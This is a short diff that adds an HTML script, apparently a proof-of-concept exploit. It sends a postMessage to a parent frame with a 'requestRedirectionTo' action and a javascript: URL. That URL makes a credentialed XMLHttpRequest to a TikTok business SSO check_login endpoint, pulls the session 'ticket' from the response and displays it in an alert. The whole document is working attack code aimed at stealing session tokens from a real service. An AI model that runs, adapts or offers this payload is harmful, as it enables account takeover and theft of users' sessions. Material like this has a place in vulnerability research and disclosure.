@@ -1,0 +1,6 @@
+<script>
+parent.postMessage({
+    action: "requestRedirectionTo",
+    targetUrlStr: "javascript:var xhr=new XMLHttpRequest();xhr.open('GET','https://business-sso.tiktok.com/check_login/',true);xhr.withCredentials=true;xhr.onload=function(){var t=JSON.parse(xhr.responseText).ticket;alert('session token is '+t);};xhr.send();"
+}, "*");
+</script>
